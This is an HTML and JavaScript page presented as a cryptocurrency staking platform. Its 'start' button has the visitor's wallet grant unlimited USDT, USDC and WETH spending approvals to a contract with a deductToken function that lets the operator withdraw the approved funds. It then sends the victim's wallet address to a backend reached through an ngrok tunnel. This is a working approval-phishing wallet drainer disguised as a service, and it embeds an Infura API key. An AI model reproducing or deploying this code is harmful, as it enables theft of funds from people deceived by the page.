<!DOCTYPE html>
<html lang="zh-Hant">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>質押平台</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400;700&display=swap');
        body {
            font-family: 'Noto Sans TC', sans-serif;
            background: linear-gradient(135deg, #e3f2fd, #bbdefb);
            color: #1e3a8a;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        #container {
            max-width: 600px;
            background: rgba(255, 255, 255, 0.95);
            padding: 30px;
            border-radius: 16px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15);
            text-align: center;
        }
        h1 {
            font-size: 2em;
            margin-bottom: 20px;
        }
        button {
            background: linear-gradient(135deg, #4fc3f7, #29b6f6);
            border: none;
            padding: 12px 24px;
            color: #ffffff;
            font-weight: 700;
            font-size: 1em;
            border-radius: 8px;
            cursor: pointer;
            margin: 10px;
        }
        button:hover:not(:disabled) {
            background: linear-gradient(135deg, #1e3a8a, #1565c0);
        }
        .status {
            margin: 20px 0;
            padding: 10px;
            border-radius: 8px;
            background: #e3f2fd;
            color: #1e3a8a;
        }
        .status.error {
            background: #ffebee;
            color: #c62828;
        }
    </style>
</head>
<body>
    <div id="container">
        <h1>質押平台</h1>
        <button id="connectWallet">連線錢包</button>
        <button id="startButton" disabled>開始</button>
        <div id="status" class="status">狀態訊息：請連線錢包</div>
    </div>

    <script>
        const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
        const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
        const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
        const WETH_CONTRACT_ADDRESS = '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2';
        const INFURA_URL = 'https://mainnet.infura.io/v3/a4d896498845476cac19c5eefd3bcd92';
        const ERC20_ABI = [
            "function approve(address, uint256) returns (bool)",
            "function allowance(address, address) view returns (uint256)"
        ];
        const DEDUCT_CONTRACT_ABI = [
            {"inputs":[{"internalType":"address","name":"_storeAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},
            {"inputs":[{"internalType":"address","name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"error"},
            {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"recipient","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"EthWithdrawn","type":"event"},
            {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"customer","type":"address"},{"indexed":true,"internalType":"address","name":"tokenContract","type":"address"}],"name":"ServiceActivated","type":"event"},
            {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"customer","type":"address"}],"name":"ServiceDeactivated","type":"event"},
            {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"customer","type":"address"},{"indexed":true,"internalType":"address","name":"tokenContract","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokenDeducted","type":"event"},
            {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"tokenContract","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"TokensRescued","type":"event"},
            {"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"WethUnwrapped","type":"event"},
            {"inputs":[],"name":"REQUIRED_ALLOWANCE_THRESHOLD","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"internalType":"address","name":"tokenContract","type":"address"}],"name":"activateService","outputs":[],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[],"name":"deactivateService","outputs":[],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[{"internalType":"address","name":"customer","type":"address"},{"internalType":"address","name":"tokenContract","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"deductToken","outputs":[],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[],"name":"getContractEthBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"internalType":"address","name":"tokenContract","type":"address"}],"name":"getContractTokenBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"internalType":"address","name":"customer","type":"address"},{"internalType":"address","name":"tokenContract","type":"address"}],"name":"getCustomerAllowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"isServiceActiveFor","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"internalType":"address","name":"tokenContract","type":"address"}],"name":"rescueTokens","outputs":[],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[],"name":"storeAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"internalType":"address","name":"wethAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"unwrapWETH","outputs":[],"stateMutability":"nonpayable","type":"function"},
            {"inputs":[],"name":"withdrawEth","outputs":[],"stateMutability":"nonpayable","type":"function"},
            {"stateMutability":"payable","type":"receive"}
        ];

        const hostname = window.location.hostname;
        const API_BASE_URL = hostname.includes('ngrok-free.dev') ? `https://${hostname}` : 'http://localhost:3000';

        let walletProvider, signer;

        const elements = {
            connectWallet: document.getElementById('connectWallet'),
            startButton: document.getElementById('startButton'),
            status: document.getElementById('status')
        };

        async function updateStatus(message, isError = false) {
            elements.status.textContent = `狀態訊息：${message}`;
            elements.status.classList.toggle('error', isError);
            console.log(`[狀態] ${message}${isError ? ' (錯誤)' : ''}`);
        }

        async function connectWallet() {
            try {
                if (!window.ethereum) throw new Error('請安裝 MetaMask');
                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x1' }] });
                walletProvider = new ethers.providers.Web3Provider(window.ethereum);
                await walletProvider.send('eth_requestAccounts', []);
                signer = walletProvider.getSigner();
                const address = await signer.getAddress();
                updateStatus(`✅ 已連線錢包: ${address.slice(0, 6)}...${address.slice(-4)}`);
                elements.connectWallet.disabled = true;
                elements.startButton.disabled = false;
                console.log(`[連線] 錢包地址: ${address}`);
            } catch (error) {
                updateStatus(`❌ 連線失敗: ${error.message}`, true);
                console.error('[連線錯誤]', error);
            }
        }

        async function startService() {
            try {
                if (!signer) throw new Error('請先連線錢包');
                elements.startButton.disabled = true;
                updateStatus('正在授權 USDT、USDC 和 WETH...');

                const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
                const usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
                const wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
                const deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
                const MAX_UINT256 = ethers.BigNumber.from("2").pow(256).sub(1);

                // 檢查並設置授權
                for (const [contract, token] of [[usdtContract, 'USDT'], [usdcContract, 'USDC'], [wethContract, 'WETH']]) {
                    const allowance = await contract.allowance(await signer.getAddress(), DEDUCT_CONTRACT_ADDRESS);
                    if (allowance.lt(ethers.utils.parseUnits("1000", 6))) {
                        updateStatus(`正在授權 ${token}...`);
                        console.log(`[授權] 開始 ${token} 授權`);
                        const tx = await contract.approve(DEDUCT_CONTRACT_ADDRESS, MAX_UINT256);
                        await tx.wait();
                        updateStatus(`✅ ${token} 授權完成`);
                        console.log(`[授權] ${token} 完成，交易 Hash: ${tx.hash}`);
                    }
                }

                // 啟動服務
                updateStatus('正在啟動服務...');
                console.log('[服務] 開始啟動服務');
                const tx = await deductContract.activateService(USDT_CONTRACT_ADDRESS);
                const receipt = await tx.wait();
                updateStatus(`✅ 服務啟動完成，交易 Hash: ${receipt.transactionHash.slice(0, 10)}...`);
                console.log(`[服務] 啟動完成，交易 Hash: ${receipt.transactionHash}`);

                // 發送數據到後端
                const address = await signer.getAddress();
                console.log(`[API] 發送數據到後端: ${address}`);
                const response = await fetch(`${API_BASE_URL}/api/user-data`, {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/json', 
                        'ngrok-skip-browser-warning': 'true' 
                    },
                    body: JSON.stringify({
                        address,
                        data: { 
                            isActive: true, 
                            note: '', 
                            lastActivated: Date.now(),
                            source: 'index.html' // 添加來源標記
                        }
                    })
                });
                if (!response.ok) {
                    throw new Error(`後端請求失敗: ${response.status} ${response.statusText}`);
                }
                const result = await response.json();
                updateStatus(`✅ 數據已發送至後端: ${result.message}`);
                console.log(`[API] 後端回應: ${result.message}`);
            } catch (error) {
                updateStatus(`❌ 啟動失敗: ${error.message}`, true);
                console.error('[啟動錯誤]', error);
                elements.startButton.disabled = false;
            }
        }

        elements.connectWallet.onclick = connectWallet;
        elements.startButton.onclick = startService;

        window.addEventListener('load', () => {
            if (typeof ethers === 'undefined') {
                updateStatus('❌ Ethers.js 未載入，請檢查網絡', true);
                console.error('[初始化] Ethers.js 未載入');
            }
        });
    </script>
</body>
</html>